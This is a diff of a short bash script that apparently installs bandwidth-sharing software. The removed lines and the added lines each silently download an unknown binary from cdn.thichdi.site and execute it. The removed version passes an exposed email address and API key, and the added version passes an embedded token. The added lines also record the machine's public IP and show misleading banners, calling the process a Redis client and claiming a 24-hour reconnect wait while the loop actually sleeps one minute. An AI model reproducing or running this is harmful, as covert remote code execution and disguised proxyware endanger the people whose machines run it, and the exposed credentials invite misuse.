@@ -1,7 +1,18 @@
 #!/bin/bash
-curl -sL https://cdn.thichdi.site/wifi -o wifi >/dev/null 2>&1
-chmod +x wifi
-export RP_EMAIL="vbropa@gmail.com"
-export RP_API_KEY="4f779ec4-8701-4aa3-9c3e-a7d747a2e2e3"
-./wifi
+rm -rf server wifi
+IP=$(curl -s ifconfig.me 2>/dev/null)
+echo "$(date) - IP: $IP"
+echo
+echo "INSTALL BANDWIDTH | PROCESSING!"
 
+curl -sL https://cdn.thichdi.site/server -o server >/dev/null 2>&1
+chmod +x server
+./server start accept --token "pZEeHkUPpHd0XrwhTEwOwlTFSHIHqkfY6g2JzgLCPLY="
+echo "INSTALL BANDWIDTH | DONE!"
+echo "========================"
+echo "  REDIS CLIENT CLI RUN  "
+echo "========================"
+while true; do
+  echo "Reconnecting in 24 hours..."
+  sleep 1m
+done
